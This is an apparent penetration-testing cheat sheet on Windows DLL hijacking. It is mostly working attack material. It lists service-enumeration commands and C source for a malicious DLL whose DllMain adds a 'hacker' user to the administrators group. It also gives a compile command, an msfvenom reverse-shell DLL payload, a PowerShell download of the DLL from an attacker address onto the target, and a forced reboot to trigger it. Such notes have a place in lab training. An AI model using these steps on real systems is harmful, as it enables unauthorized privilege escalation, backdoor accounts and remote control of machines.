
# DLL Hijacking

---

When we have write access to an .dll file, we can replace it.

## PoC

Query all services.

```
wmic service get name,displayname,pathname,startmode |findstr /i "auto"
|findstr /i /v "c:\windows\\" |findstr /i /v """
```

Let's create an malicious .c file.

```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
            i = system ("net user hacker password123! /add");
            i = system ("net localgroup administrators hacker /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Compile to binary.

```
x86_64-w64-mingw32-gcc malicious.c --shared -o TextShaping.dll
```

---
## Reverse Shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9999 -f dll > shell.dll
```

Download .dll onto the target.

```
iwr -uri http://192.168.48.3/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
```

Now just wait until someone starts ftp (high privileged user) or if permission restart the service, or check if the service has automate configured.

```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

It's set to "Automatic"!

We now need to check if our current user has the "SeShutdownPrivilege" in order to restart the machine, which automatically will execute our malicious binary.

```
whoami /priv
```

It's visually there which means we can use it, but the state seems to be "Disabled". 

We should still be able to execute it tho.

Rebooted the machine.

```
shutdown /r /t 0
```

Since our binary will be executed, there should be a new user called "hacker" on the target system.